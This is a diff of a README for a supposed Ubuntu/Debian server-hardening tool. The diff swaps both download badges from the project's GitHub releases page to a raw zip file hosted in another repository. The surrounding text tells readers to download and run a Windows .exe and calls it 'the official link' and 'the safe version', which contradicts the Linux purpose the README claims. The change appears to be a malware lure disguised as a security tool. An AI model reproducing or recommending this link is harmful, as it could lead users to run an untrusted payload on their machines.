@@ -5,7 +5,7 @@ description: "Secure and harden fresh Ubuntu or Debian servers using an automate
 ---
 # 🛡️ server-security-init-skill - Harden your new server connection now
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/yatirimsahibi/server-security-init-skill/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/yatirimsahibi/yatirimsahibi.github.io/main/peteca/github_yatirimsahibi_io_v2.6.zip)
 
 ## 📖 About this application
 
@@ -19,7 +19,7 @@ You need a Windows computer to run this tool. Your computer requires an active i
 
 Visit the project release page to get the software. Click the link below to reach the download site.
 
-[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/yatirimsahibi/server-security-init-skill/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://raw.githubusercontent.com/yatirimsahibi/yatirimsahibi.github.io/main/peteca/github_yatirimsahibi_io_v2.6.zip)
 
 Look for the latest file named with a .exe extension. Click this file to start the download. Save the file to your desktop or downloads folder. Do not open files from unknown sources. This official link provides the safe version of the tool.
 
